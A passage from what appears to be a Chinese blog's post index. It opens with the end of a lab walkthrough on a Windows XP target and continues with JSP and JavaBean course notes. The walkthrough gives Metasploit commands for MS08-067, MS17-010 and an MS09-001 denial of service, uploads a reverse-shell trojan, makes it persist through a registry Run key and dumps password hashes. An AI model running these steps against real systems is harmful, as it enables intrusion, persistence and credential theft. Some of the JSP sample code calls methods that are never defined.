jian.exe\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image030.jpg)\n\n利用上面漏洞将做好的木马植入靶机\n\n```bash\nsudo msfdb init && msfconsole\nsearch ms08-067\nuse exploit/windows/smb/ms08_067_netapi\nshow options\nset RHOSTS 192.168.1.102\nRun\nshell\n```\n\n使用upload上传木马\n\n```bash\nupload /home/kali/Desktop/jian.exe C:\\\\WINDOWS\\\\system32\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image032.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image034.jpg)\n\n可以看到jian.exe已经成功上传到靶机\n\n在获取的shell上运行jian.exe，成功反弹shell到攻击机上【就是上面监听端口等待反弹shell的那个窗口】\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603120744598.png)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image038.jpg)\n\n##### 设置木马开机启动\n\n设置木马开机启动：利用注册表添加后门，先查看原开机启动的应用\n\n```bash\nreg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image040.jpg)\n\n利用注册表增加开机启动应用,添加注册表信息，设置jian.exe开机自启。\n\n```\nreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v sys -d 'C:\\WINDOWS\\system32\\jian.exe Ldp 443 -e cmd.exe'\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image042.jpg)\n\n#### 其他操作\n\n还可以通过sysinfol来查看系统信息。\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image044.jpg)\n\n使用hashdump来查看系统用户名和密码的hash值，如果密码简单，可以通过爆破hash来得到登录密码。\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image046.jpg)\n\n### MS17-010(永恒之蓝)\n\n跟上面漏洞利用差不多\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image002-1591158343850.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image004-1591158343851.jpg)\n\n成功getshell，后续操作跟前面一样\n\n### MS09-001\n\n```\nsudo msfdb init && msfconsole\n\nSearch MS09-001\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image048.jpg)\n\n```bash\nuse auxiliary/dos/windows/smb/ms09_001_write\n\nshow options\n\nset RHOSTS 192.168.1.102\n\nrun 或者 exploit\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image050.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image052.jpg)\n\n对靶机发起了拒绝服务攻击,具体对靶机的影响暂时不知\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["靶场","内网渗透"],"categories":["Web"]},{"title":"JSP学习笔记","url":"/posts/59789.html","content":"\n本文章是Java web 课的课堂笔记，一来觉得学东西的时候记录下来效率会比较高，二来记忆力下降明显，方便自己以后复习吧😁😁\n\n## JSP简介✨\n\nJSP（Java Server Page，Java服务器页面）是由Sun公司倡导、许多公司参与一起建立的一种动态网页技术标准。JSP是在传统的网页HTML文件中嵌入Java程序代码段和JSP标记，从而形成JSP文件，后缀名为“.jsp”。\n\n![JSP程序运行机制](https://img.jwt1399.top//img/20200527192324.png)\n\n## JSP 开发环境搭建\n\n首先配置 JDK 环境，如未安装，可参阅 [Java 开发环境配置 ](https://www.runoob.com/java/java-environment-setup.html)\n\n然后配置JSP环境，如果你使用的是 Eclipse ，可以直接参阅：[Eclipse JSP/Servlet 环境搭建](https://www.runoob.com/jsp/eclipse-jsp.html)。\n\n| Tomcat目录   | 用途                                                         |\n| ------------ | ------------------------------------------------------------ |\n| /bin         | 存放启动和关闭Tomcat的命令文件                               |\n| /lib         | 存放Tomcat服务器及所有Web应用程序都可以访问的JAR文件         |\n| /conf        | 存放Tomcat的配置文件，如server.xml,web.xml等                 |\n| /logs        | 存放Tomcat的日志文件                                         |\n| /temp        | 存放Tomcat运行时产生的临时文件                               |\n| **/webapps** | **通常把Web应用程序的目录及文件放到这个目录下，其中的Root文件夹为默认的根目录** |\n| /work        | Tomcat将JSP生成的Servlet源文件和字节码文件放到这个目录下     |\n\n## JSP元素\n\n> JSP的标签是以“`<%`”开始，以“`%>`”结束的，而被标签包围的部分则称为JSP元素的内容。\n\nJSP元素分为3种类型：基本元素，指令元素，动作元素。\n\n| 类型     | 功能                                     | 包含                              |\n| -------- | ---------------------------------------- | --------------------------------- |\n| 基本元素 | 规范JSP网页所使用的Java代码              | JSP注释、声明、表达式和脚本段。   |\n| 指令元素 | 设置jsp页面编译的相关属性                | include指令、page指令和taglib指令 |\n| 动作元素 | 用来实现请求转发、动态包含其他文件等功能 | include动作和forward动作          |\n\n## JSP基本元素\n\n| 基本元素  | 语法                        |\n| --------- | --------------------------- |\n| JSP注释   | `<%-- 注释 --%>`            |\n| JSP声明   | `<%! 声明变量、方法和类 %>` |\n| JSP表达式 | `<%= 表达式 %>`             |\n| JSP脚本段 | `<% 代码片段 %>`            |\n\n**JSP示例🌰**\n\n```html\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>  <%--如果我们要在页面正常显示中文必须加上这句--%>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>JSP基本元素</title>\n</head>\n<body>\n<p>JSP基本元素</p>\n<%! int x=100,y=500,z;%> <%-- 声明整型变量x,y,z --%> \n<%     \n    z=x+y;\n%>\n<p>x+y的和z为：<%= z %></p>    <%-- 显示z的值 --%> \n</body>\n</html>\n```\n\n**补充：**\n\nHTML注释：  `<!-- 要添加的文本注释 -->`\n\nJAVA注释：`<% //要添加的文本注释 %>`  或  `<% /*要添加的文本注释*/ %>`\n\n## JSP 指令元素\n\n| **指令**           | **描述**                                                |\n| :----------------- | :------------------------------------------------------ |\n| <%@ page ... %>    | 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等 |\n| <%@ include ... %> | 包含其他文件                                            |\n| <%@ taglib ... %>  | 引入标签库的定义                                        |\n\n### Page指令\n\n```html\n<%@ page 属性1=\"值1\" 属性2=\"值2\" ... %>\n```\n\n| 属性             | 说明                                                         | 设置值示例                     |\n| ---------------- | ------------------------------------------------------------ | ------------------------------ |\n| **language**     | **指定用到的脚本语言，默认是Java**                           | **<%@page  language=\"java\"%>** |\n| **import**       | **用于导入java包或java类**                                   | **import=\"Java.util.Date\"**    |\n| **pageEncoding** | **指定页面文档所用编码**                                     | **pageEncoding=\"UTF-8\"**       |\n| extends          | JSP转换成Servlet后继承的类                                   | Java.servlet.http.HttpServlet  |\n| **session**      | **指定该页面是否参与到HTTP会话中**                           | **true 或  false**             |\n| buffer           | 设置out对象缓冲区大小                                        | 8kb                            |\n| autoflush        | 设置是否自动刷新缓冲区                                       | true  或 false                 |\n| isThreadSafe     | 设置该页面是否是线程安全                                     | true  或 false                 |\n| info             | 设置页面的相关信息                                           | 网站主页面                     |\n| errorPage        | 设置当页面出错后要跳转到的页面                               | /error/jsp-error.jsp           |\n| **contentType**  | **设计响应jsp页面的MIME类型和字符编码，即告诉浏览器用什么编码解析服务器返回的页面** | **text/html;charset=utf-8**    |\n| isErrorPage      | 设置是否是一个错误处理页面                                   | true  或 false                 |\n| isELIgnord       | 设置是否忽略正则表达式                                       | true  或 false                 |\n\n### Include指令\n\n```html\n<%@ include file=\"文件路径\" %>\n```\n\n### Taglib指令\n\n```html\n<%@ taglib uri=\"uri\" prefix=\"prefixOfTag\" %>\n```\n\n## JSP动作元素\n\n| 语法                | 描述                                                         |\n| ------------------- | ------------------------------------------------------------ |\n| `<jsp:include>`     | 在页面得到请求时动态包含一个文件。                           |\n| `<jsp:forward>`     | 把请求转到一个新的页面。                                     |\n| `<jsp:plugin>`      | 连接客户端的Applet或Bean插件。                               |\n| `<jsp:useBean>`     | 应用JavaBean组建。                                           |\n| `<jsp:setProperty>` | 设置JavaBean的属性值。                                       |\n| `<jsp:getProperty>` | 获取JavaBean的属性值并输出。                                 |\n| `<jsp:param>`       | 实现参数传递子动作元素，param标记不能独立使用，需作为`<jsp:include>、<jsp:forward>`标记的子标记来使用。 |\n\n### `<jsp:include>`\n\n> 用于向当前的页面中动态包含其他的文件，这个文件可以是动态文件也可以是静态文件。\n\n**语法：**\n\n```java\n<jsp:include page=\"被包含文件的路径\" flush=\"true|false\"/>\n```\n\nflush：定义在包含资源前是否刷新缓存区。\n\n**向被包含的动态页面中传递参数：**\n\n```java\n<jsp:include page=\"被包含文件的路径\" flush=\"true|false\">\n  \t<jsp:param name=\"参数名称\" value=\"参数值\"/>\n</jsp:include>\n```\n\n`<jsp:include>`动作与`<%@ include file=“文件路径”%>`的区别：\n\n![](https://img.jwt1399.top//img/20200527213606.png)\n\n### `<jsp:forward>`\n\n> 用来将请求转发到另外一个JSP、HTML或相关的资源文件中。\n\n**语法：**\n\n```java\n<jsp:forward page=\"文件路径\"/>\n```\n\n如果转发的目标是一个动态文件，还可以向该文件中传递参数，使用格式如下：\n\n```java\n<jsp:forward page=\"被包含文件的路径\">\n  \t<jsp:param name=\"参数名称\" value=\"参数值\"/>\n</jsp:forward>\n```\n\n## JSP内置对象\n\n> JSP中为了便于数据信息的保存、传递、获取等操作，提供了9个内置对象，这些内置对象由JSP引擎（或容器）自动创建，开发者可在内置对象的生命周期内在脚本代码和表达式中使用。\n\n| 对象名称        | 所  属  类  型                             | 有效范围        | 说明                                                         |\n| --------------- | ------------------------------------------ | --------------- | ------------------------------------------------------------ |\n| **application** | **javax.servlet.ServletContext**           | **application** | **代表应用程序上下文，允许JSP页面与包括在同一应用程序中的任何Web组件共享信息** |\n| config          | javax.servlet.ServletConfig                | page            | 允许将初始化数据传递给一个JSP页面                            |\n| exception       | java.lang.Throwable                        | page            | 该对象含有只能由指定的JSP“错误处理页面”访问的异常数据        |\n| **out**         | **javax.servlet.jsp.JspWriter**            | **page**        | **提供对输出流的访问**                                       |\n| page            | javax.servlet.jsp.HttpJspPage              | page            | 代表JSP页面对应的Servlet类实例                               |\n| pageContext     | javax.servlet.jsp.PageContext              | page            | 是JSP页面本身的上下文，它提供了唯一一组方法来管理具有不同作用域的属性 |\n| **request**     | **javax.servlet.http.HttpServletRequest**  | **request**     | **提供对请求数据的访问，同时还提供用于加入特定请求数据的上下文** |\n| **response**    | **javax.servlet.http.HttpServletResponse** | **page**        | **该对象用来向客户端输入数据**                               |\n| **session**     | **javax.servlet.http.HttpSession**         | **session**     | **用来保存在服务器与一个客户端之间需要保存的数据，当客户端关闭网站的所有网页时，session变量会自动消失** |\n\n### request对象的常用方法🐱‍🏍\n\n> 当客户端通过HTTP协议请求或转发一个JSP页面，JSP容器会自动创建request对象并将请求信息包装到request对象中，当JSP容器处理完请求后，request对象就会销毁。request对象包含了用户提交的信息以及客户端信息。\n\n| 方法                                   | 说明                                                         |\n| -------------------------------------- | ------------------------------------------------------------ |\n| `setAttribute(String name,Object obj)` | `用于设置request中的属性及其属性值`                          |\n| `getAttribute(String name)`            | `用于返回name指定的属性值，若不存在指定的属性，就返回null。` |\n| `removeAttribute(String name)`         | `用于删除请求中的一个属性`                                   |\n| `getParameter(String name)`            | `用于获得客户端传送给服务器端的参数值`                       |\n| getParameterNames()                    | 用于获得客户端传送给服务器端的所有参数名字                   |\n| `getParameterValues(String name)`      | `用于获得指定参数的所有值（表单中复选框同名，列表项多选时）` |\n| getCookies()                           | 用于返回客户端的所有Cookie对象，结果是一个Cookie数组         |\n| getCharacterEncoding()                 | 返回请求中的字符编码方式                                     |\n| getRequestURI()                        | 用于获取发出请求字符串的客户端地址                           |\n| getRemoteAddr()                        | 用于获取客户端IP地址                                         |\n| getRemoteHost()                        | 用于获取客户端名字                                           |\n| getSession([Boolean  create])          | 用于返回和请求相关的session                                  |\n| getServerName()                        | 用于获取服务器的名字                                         |\n| getServletPath()                       | 用于获取客户端所请求的脚本文件的文件路径。                   |\n| getServerPort()                        | 用于获取服务器的端口号                                       |\n\n#### 访问请求参数的方法\n\n```java\nString 变量名 = request.getParameter(\"客户端提供参数的name属性名\");\n```\n\n**实列🌰**\n\n> `题目：`利用表单传递参数。提交页面上有两个文本框，在文本框中输入姓名和电话号码，单击“提交”按钮后，由服务器端应用程序接收提交的表单信息并显示出来。\n\n![](https://img.jwt1399.top//img/20200528095309.png)\n\n`infoInput.jsp`\n\n```java\n<form action= \"infoReceive.jsp\"  method=\"post\">\n     姓名: <input type=\"text\" name= \"rdName\"> <br>\n     电话: <input  type=\"tel\" name= \"phName\"> <br>\n     <input type=\"submit\" value=\"提 交\">\n</form>\n```\n\n`infoReceive.jsp`\n\n```java\n<body>\n    <%   String str1=request.getParameter(\"rdName\");\n         String str2=request.getParameter(\"phName\");\n    %>\n   <font face=\"楷体\" size=4 color=blue> \n        您输入的信息为：<br> \n        姓名：<%=str1%><br>\n        电话：<%=str2%><br> \n  </font>\n</body>\n```\n\n| infoInput.jsp                                        | infoReceive.jsp                                      |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200528094724.png) | ![](https://img.jwt1399.top//img/20200528094729.png) |\n\n#### 新属性的设置和获取\n\n**设置数据的方法格式：**     \n\n```java\nvoid request.setAttribute(String name,Object);\n```\n\n参数name表示键名，为String类型；参数object是键值，为Object类型，它代表需要保存在request范围内的数据。\n\n**获取数据的方法格式：**\n\n```java\nObject request.getAttribute(String name);\n```\n\n参数name表示键名，所获取的数据类型是由setAttribute(\"name\",obj)中的obj类型决定的。\n\n**实列🌰**\n\n> `题目：`设计一个Web程序，实现由提交页面提交的任意两个实数的和，并给出结果显示。\n\n![](https://img.jwt1399.top//img/20200607101236.png)\n\n`input.jsp`\n\n```html\n<form action=\"sum.jsp\" method=post>\n    数据1: <input type=\"text\" name=\"shuju1\" ><br>\n    数据2: <input type=\"text\" name=\"shuju2\" ><br>\n    <input type=\"submit\" value=\"提交\" >\n</form>\n```\n\n`sum.jsp`\n\n```java\n<%  String str1=request.getParameter(\"shuju1\");\n    String str2=request.getParameter(\"shuju2\");\n    double s1=Double.parseDouble(str1);\n    double s2=Double.parseDouble(str2);\n    double s3=s1+s2;\n    request.setAttribute(\"st1\",s1);\n    request.setAttribute(\"st2\",s2);\n    request.setAttribute(\"st3\",s3);\n%>\n<jsp:forward page=\"output.jsp\"></jsp:forward>\n```\n\n`output.jsp`\n\n```java\n利用getAttribute方法获取利用setAttribute方法保存的值，并显示！<br>\n<% Double  a1=(Double)request.getAttribute(\"st1\");\n   Double  a2=(Double)request.getAttribute(\"st2\");\n   Double  a3=(Double)request.getAttribute(\"st3\");\n%>\n <%=a1%>+<%=a2%>=<%=a3%><br>\n利用getParameter方法获取获取请求参数，并显示！<br>\n<%   String  s1=request.getParameter(\"shuju1\");\n     String  s2=request.getParameter(\"shuju2\");\n%>       \n <%=s1%>+<%=s2%>=<%=a3%><br>\n```\n\n| input.jsp                                            | output.jsp                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200607115245.png) | ![](https://img.jwt1399.top//img/20200607115236.png) |\n\n但是上面挨个数据获得、存储和处理，数据封装性差，操作不便：\n\n**改进思路：**\n\n（1）创建一个Add类，封装操作数和操作方法；\n\n（2）在sum页面中使用Add类对象计算出结果，并使用request的setAttribute (String,Object)方法保存Add类对象；\n\n（3）在output.jsp页面中使用request的getAttribute(String)获得Add类对象，并显示\n\n创建一个Add类，封装操作数和操作方法；\n\n```java\npackage beans;\n\npublic class Add {\nprivate int shuju1;\nprivate int shuju2;\nprivate int sum;\n\npublic Add() {}\npublic int getShuju1() {\nreturn shuju1;\n}\npublic void setShuju1(int shuju1) {\nthis.shuju1 = shuju1;\n}\npublic int getShuju2() {\nreturn shuju2;\n}\npublic void setShuju2(int shuju2) {\nthis.shuju2 = shuju2;\n}\npublic int getSum() {\nreturn shuju1 + shuju2;\n}\n}\n\n```\n\n在`sum.jsp`页面中使用Add类对象计算出结果，并使用request的setAttribute (String,Object)方法保存Add类对象；\n\n```html\n<% String str1=request.getParameter(\"shuju1\");\n   String str2=request.getParameter(\"shuju2\");\n   double s1=Double.parseDouble(str1);\n   double s2=Double.parseDouble(str2);\n   Add add = new Add(s1,s2);\n   add.setSum();\n   request.setAttribute(\"a_dd\",add);\n%>\n<jsp:forward page=\"output.jsp\"></jsp:forward>\n```\n\n在`output.jsp`页面中使用request的getAttribute(String)获得Add类对象，并显示\n\n```html\n利用getAttribute方法获取利用setAttribute方法保存的Add对象，并显示其属性！<br>\n<% Add add = (Add)request.getAttribute(\"a_dd\"); %> \n    求和结果：<br>\n<%=add.getShuju1()%> + <%=add.getShuju2()%> = <%=add.getSum()%><br>\n```\n\n| input.jsp                                            | output.jsp                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200607115245.png) | ![](https://img.jwt1399.top//img/20200607120221.png) |\n\n#### 获取客户端信息\n\n`input.jsp`\n\n```java\n<form action=\"ch03_10_showInfo.jsp\" method=post>\n    数据1: <input type=\"text\" name=\"shuju1\" ><br>\n    数据2: <input type=\"text\" name=\"shuju2\" ><br>\n    <input type=\"submit\" value=\"提交\" >\n</form>\n```\n\n`ch03_10_showInfo.jsp`\n\n```java\n<body>\n    <font color=\"blue\">表单提交的信息：</font><br>\n    输入的第1个数据是：<%=request.getParameter(\"shuju1\") %><br>\n    输入的第2个数据是：<%=request.getParameter(\"shuju2\") %><br><br>\n    <font  color=\"red\">客户端信息：</font><br>\n    客户端协议名和版本号： <%=request.getProtocol() %><br> \n    客户机名： <%=request.getRemoteHost() %><br>\n    客户机的IP地址： <%= request.getRemoteAddr() %><br>\n    客户提交信息的长度： <%= request.getContentLength() %><br>\n    客户提交信息的方式： <%= request.getMethod() %><br>\n    HTTP头文件中Host值： <%= request.getHeader(\"Host\") %><br>\n    服务器名： <%= request.getServerName() %><br>\n    服务器端口号： <%= request.getServerPort() %><br>\n    接受客户提交信息的页面： <%= request.getServletPath() %><br>\n</body>\n```\n\n![](https://img.jwt1399.top//img/20200607121131.png)\n\n### response对象的常用方法🚴‍♀️\n\n> 用于响应客户请求，由服务器向客户端输出信息。当服务器向客户端传送数据时，JSP容器会自动创建response对象并请信息封装到response对象中，当JSP容器处理完请求后，response对象会被销毁。response和request结合起来完成动态网页的交互功能。\n\n| 方法                                                     | 说明                                                         |\n| -------------------------------------------------------- | ------------------------------------------------------------ |\n| `SendRedirect(String                               url)` | `使用指定的重定向位置url向客户端发送重定向响应`              |\n| setDateHeader(String  name,long  date)                   | 使用给定的名称和日期值设置一个响应报头，  如果指定的名称已经设置，则新值会覆盖旧值 |\n| `setHeader(String name,String value)`                    | `使用给定的名称和值设置一个响应报头，如果指定的名称已经设置，则新值会覆盖旧值` |\n| setHeader(String  name,int  value)                       | 使用给定的名称和整数值设置一个响应报头，  如果指定的名称已经设置，则新值会覆盖旧值 |\n| setContentType(String  type)                             | 为响应设置内容类型，其参数值可以为text/html，text/plain，application/x_msexcel或application/msword |\n| setContentLength(int  len)                               | 为响应设置内容长度                                           |\n| setLocale(java.util.Locale loc)                          | 为响应设置地区信息                                           |\n\n#### 重定向网页\n\n```java\nresponse.sendRedirect(\"url\");\n```\n\n**注意：**重定向`sendRedirect(String url)`和转发`<jsp:forward page=\" \"/>`的区别：\n\n（1）`<jsp:forward>`只能在本网站内跳转，而使用`response.sendRedirect`可以跳转到任何一个地址的页面\n\n（2）`<jsp:forward>`带着request中的信息跳转；sendRedirect不带request信息跳转。(此时，可借助session对象存取信息)\n\n**实列🌰**\n\n> `题目：`用户在登录界面（userLogin.jsp）输入用户名和密码，提交后验证（userReceive.jsp）登录者输入的用户名和密码是否正确，根据判断结果转向不同的页面，当输入的用户名是“abcdef”，密码为“123456”时转发到（loginCorrect.jsp）页面，并显示 “用户：abcdef成功登入!” ，当输入信息不正确，重定位到搜狐网站(`http://sohu.com`)。\n\n![](https://img.jwt1399.top//img/20200607123454.png) \n\n`userLogin.jsp`\n\n```html\n<form action=\"userReceive.jsp\" method=\"post\">\n        姓 名: <input type=\"text\" name=\"RdName\"> <br>\n        密 码: <input type=\"password\" name=\"RdPasswd\" > <br><br> \n        <input type=\"submit\" value=\"确 定\" >\n</form>\n```\n\n`userReceive.jsp`\n\n```java\n<%\tString Name = request.getParameter(\"RdName\");\n\tString Passwd = request.getParameter(\"RdPasswd\");\n\tif (Name.equals(\"abcdef\") && Passwd.equals(\"123456\")){ %>\n    \t<jsp:forward page=\"loginCorrect.jsp\"/>\n    <%}else{\n    response.sendRedirect(\"http://sohu.com\");\n\t}%>\n```\n\n`loginCorrect.jsp`\n\n```java\n<% String Name = request.getParameter(\"RdName\"); %>\n 欢迎，<%=Name%>成功登录！\n```\n\n#### 页面定时刷新或自动跳转\n\n```java\n//每隔5秒，页面自刷新一次\nresponse.setHeader(\"refresh\",\"5\");   \n\n//延迟10秒后，自动重定向到网页http://www.sohu.com\nresponse.setHeader(\"refresh\",\"10;url=http://www.sohu.com\");\n```\n\n**实列🌰**\n\n> 设计一个JSP程序（time.jsp），每间隔1秒，页面自动刷新，并在页面上显示当前的时间。\n\n`time.jsp`\n\n```java\n<body>\n当前时间是：<%=new Date().toLocaleString()%><br>\n<hr>\n<%response.setHeader(\"refresh\",\"1\");%> \n</body>\n```\n\n### session对象的常用方法🏋️‍♂️\n\n> JSP为每一用户提供了一个session对象及session id，来保存特定时间内的信息（系统默认在30min内），除非用户关闭浏览器。一旦用户关闭浏览器或超过时限，那么用户的session对象将被销毁。\n\n| 方法                                          | 说明                                                         |\n| --------------------------------------------- | ------------------------------------------------------------ |\n| `Object getAttribute(String attriname)`       | 用于获取与指定名字相联系的属性  如果属性不存在，将会返回null |\n| `void setAttribute(String name,Object value)` | 用于设定指定名字的属性值，并且把它存储在session对象中        |\n| `void removeAttribute(String attriname)`      | 用于删除指定的属性（包含属性名、属性值）                     |\n| Enumeration getAttributeNames()               | 用于返回session对象中存储的每一个属性对象，结果集是一个Enumeration类的实例 |\n| long getCreationTime()                        | 用于返回session对象被创建时间，单位为毫秒                    |\n| long getLastAccessedTime()                    | 用于返回session最后发送请求的时间，单位为毫秒                |\n| String getId()                                | 用于返回Session对象在服务器端的编号                          |\n| long getMaxInactiveInterval()                 | 用于返回session对象的生存时间，单位为秒                      |\n| `boolean isNew()`                             | 用于判断目前session是否为新的Session，若是则返回ture，否则返回false |\n| `void invalidate()`                           | 用于销毁session对象，使得与其绑定的对象都无效                |\n\n#### 创建及获取客户的会话\n\n```java\n//用于是设置指定名称的属性值，并将其存储在session对象中\nsession.setAttribute(String name,String value);\n \n//获取与指定名字name相联系的属性\nsession.getAttribute(String name);\n\n```\n\n**实列🌰**\n\n> 通过setAttribute()方法将数据保存在session中，并通过getAttribute()方法取得数据的值。\n\n`index.jsp`\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%\nsession.setAttribute(\"information\",\"向session中保存数据\");\nresponse.sendRedirect(\"forward.jsp\");\n%>\n```\n\n`forward.jsp`\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<% out.print(session.getAttribute(\"information\"));%>\n```\n\n#### 从会话中移除指定的对象\n\n```java\n//从这个会话删除与指定名称绑定的对象。\nsession.removeAttribute (String name);\n```\n\n```java\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%\nsession.removeAttribute(\"information\");\nif (session.getAttribute(\"information\") == null) {\n\tout.print(\"session对象information已经不存在了\");\n}else{\n\tout.print(session.getAttribute(\"information\"));\n}\n%>\n```\n\n#### 销毁session\n\n```java\n//将会话中的全部内容删除\nsession.invalidate();\n```\n\n**session被销毁的三种情况：**\n\n- 1.客户端关闭浏览器\n- 2.Session过期\n- 3.服务器端调用了HttpSession的invalidate()方法。\n\n#### 创建及获取客户的会话信息\n\n```java\n<%@page contentType=\"text/html\" pageEncoding=\"UTF-8\" import=\"java.util.*\"%>\n<html>\n    <head><title>利用session对象获取会话信息并显示</title> </head>\n    <body>\n       <hr>\n       session的创建时间是:<%=new Date(session.getCreationTime())%> <br>\n       session的Id号:<%=session.getId()%><br>\n        客户最近一次访问时间是:\n        <%=new java.sql.Time(session.getLastAccessedTime())%> <br>\n        两次请求间隔多长时间session将被取消(ms):\n       <%=session.getMaxInactiveInterval()%> <br>\n        是否是新创建的session:<%=session.isNew()?\"是\":\"否\"%>\n       <hr>\n    </body>\n</html>\n```\n\n### application对象的常用方法🚣‍♀️\n\n> application对象用于保存Web应用程序中的公有数据，在服务器启动时对每个Web程序都自动创建一个application对象，只要不关闭服务器，application对象将一直存在，所有访问同一工程的用户可以共享application对象。\n\n| 方法                                                  | 说明                                  |\n| ----------------------------------------------------- | ------------------------------------- |\n| Object getAttribute(String attriname)                 | 获取指定属性的值。                    |\n| void setAttribute(String attriname,Object attrivalue) | 设置一个新属性并保存值。              |\n| void removeAttribute(String attriname)                | 从application对象中删除指定的属性。   |\n| Enumeration getAttributeNames()                       | 获取application对象中所有属性的形成。 |\n\n**实列🌰**\n\n> `题目：`利用application对象的属性存储统计网站访问人数。\n\n```java\n\n <%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head>  <title>统计网站访问人数及其当前在线人数</title> </head>  \n  <body>\n    <%! int number=0; %>\n        <% if(session.isNew()){//如果是一个新的会话\n        String numStr = (String)application.getAttribute(\"count\");\n        if(numStr == null){//如果是第1个访问本站\n             number=1;\n        }else{\n        number = Integer.parseInt(numStr)+1;\n        }\n        application.setAttribute(\"count\", number+\"\");\n        }\n    %>\n        欢迎访问本站，您是第  <%=number%>个访问用户。\n  </body>\n</html>\n```\n\n## JavaBean技术\n\n> JavaBean是Java Web程序的重要组件，它是一些封装了数据和操作的功能类，供JSP或Servlet调用，完成数据封装和数据处理等功能。\n\n### JavaBean的设计规则\n\n1、JavaBean是一个公共类。\n\n2、JavaBean类具有一个公共的无参的构造方法。\n\n3、JavaBean所有的属性定义为私有的。\n\n4、在JavaBean中，需要对每个属性提供两个公共方法。假设属性名字是xxx，要提供的两个方法：\n\n-  setXxx()：用来设置属性xxx的值。\n\n- getXxx()：用来获取属性xxx的值(若属性类型是boolean，则方法名为isXxx())。\n\n5、定义JavaBean时，通常放在一个命名的包下。\n\n### JavaBean的安装部署\n\n> 设计的JavaBean类，编译后，必须部署到Web应用程序中才能被JSP或Servlet调用。\n\n有三种部署方式：\n\n1、将单个JavaBean类，部署到“工程名称/WEB-INF/classes/”下。\n\n2、JavaBean的打包类Jar，部署到/WEB-INF/lib下。\n\n3、在Eclipse开发环境中，当部署Web工程时，JavaBean会自动部署到正确的位置。若设计的JavaBean被修改，需要重新部署工程才能生效。\n\n### JavaBean的JSP动作标签\n\n> 在JSP页面中，可以通过脚本代码直接访问JavaBean，也可以通过JSP动作标签来访问JavaBean。采用JSP动作标签，可以减少JSP网页中的程序代码，使它更接近于HTML页面。\n\n- `<jsp:useBean>`：声明并创建JavaBean对象实例。\n\n- `<jsp:setProperty>`：对JavaBean对象的指定属性设置值。\n\n- `<jsp:getProperty>`：获取JavaBean对象指定属性的值，并显示在网页上。\n\n#### `<jsp:useBean>`\n\n声明JavaBean对象，需要使用`<jsp:useBean>`动作标签。\n\n**功能**：在指定的作用范围内，调用由class所指定类的无参构造方法创建对象实例。若该对象在该作用范围内已存在，则不生成新对象，而是直接使用。\n\n  **声明格式：**\n\n```java\n<jsp:useBean id=\"对象名\" class= \"类名\" scope= \"有效范围\"/>\n```\n\n  **使用说明：**\n\n1、id属性：指定所要创建的对象名称。\n\n2、class属性：用来指定JavaBean的类名，注意，必须使用完全限定类名。\n\n3、scope属性：指定所创建对象的作用范围，其取值有四个：page、request、session、application，默认值是page。分别表示页面、请求、会话、应用四种范围\n\n#### `<jsp:setProperty>`\n\n设置JavaBean属性值，需要使用`<jsp:useBean>`动作标签。\n\n**功能：**为beanname对象的指定属性propertyname设置指定值beanvalue。\n\n  **声明格式：**\n\n```java\n<jsp:setProperty  property=\"propertyname\" name=\"beanname\" value=\"beanvalue\"/>\n```\n\n  **使用说明：**\n\n1、propertyname 代表 JavaBean的属性名；\n\n2、beanname 代表 JavaBean对象名，对应`<jsp:useBean>`标记的id属性\n\n3、beanvalue是要设置的值。在设置值时，自动实现类型转换（将字符串自动转换为JavaBean中属性所声明的类型）。\n\n **4种设置方式**\n\n```html\n1.简单JavaBean属性设置\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" value=\"beanvalue\" />\n功能：为beanname对象的指定属性propertyname设置指定值beanvalue\n\n2.将单个属性与输入参数直接关联\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" 